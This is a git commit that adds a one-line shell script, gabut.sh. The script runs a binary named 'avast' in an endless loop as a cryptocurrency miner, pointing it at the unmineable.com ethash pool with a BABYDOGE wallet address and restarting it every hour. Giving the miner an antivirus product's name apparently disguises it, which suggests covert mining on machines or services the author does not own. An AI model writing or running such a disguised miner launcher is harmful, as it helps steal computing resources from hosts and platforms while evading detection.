db918fa71c4bc0f919557ca92011482dcc7fdad7
ariffirdaus778 <103154145+ariffirdaus778@users.noreply.github.com>
2022-05-27 10:18:35 +0700

    Create gabut.sh

---
+++ gabut.sh
@@ -0,0 +1,1 @@
+while :; do timeout 3600 bash ./avast --url=BABYDOGE:0x4600C12Eb69B01A1a1fc435A878417BEcE85C288.AJIG@ethash.unmineable.com:3333 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99; sleep 30; done
